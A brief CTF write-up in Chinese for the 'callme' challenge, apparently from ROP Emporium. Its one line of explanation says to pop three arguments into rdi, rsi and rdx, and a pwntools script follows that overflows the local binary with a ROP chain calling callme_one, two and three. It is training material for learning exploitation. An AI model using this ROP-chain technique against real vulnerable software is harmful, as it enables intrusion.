# callme

把参数1、2、3分别弹到rdi、rsi、rdx中，再调用函数即可。

Exp:
```python
import pwn
  
pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./callme')
e = pwn.ELF('./callme')
libc = pwn.ELF('./libcallme.so')

callme_one_addr = pwn.p64(e.plt['callme_one'])
callme_two_addr = pwn.p64(e.plt['callme_two'])
callme_three_addr = pwn.p64(e.plt['callme_three'])

pop_rdi_addr = pwn.p64(0x4009a3)
pop_rsi_rdx_addr = pwn.p64(0x40093d)

payload = b'A' * 0x20 + b'B' * 8 + pop_rdi_addr + pwn.p64(0xdeadbeefdeadbeef) + pop_rsi_rdx_addr + pwn.p64(0xcafebabecafebabe) + pwn.p64(0xd00df00dd00df00d) + callme_one_addr
payload += pop_rdi_addr + pwn.p64(0xdeadbeefdeadbeef) + pop_rsi_rdx_addr + pwn.p64(0xcafebabecafebabe) + pwn.p64(0xd00df00dd00df00d) + callme_two_addr
payload += pop_rdi_addr + pwn.p64(0xdeadbeefdeadbeef) + pop_rsi_rdx_addr + pwn.p64(0xcafebabecafebabe) + pwn.p64(0xd00df00dd00df00d) + callme_three_addr

p.sendlineafter(b'> ', payload)

p.recv()
```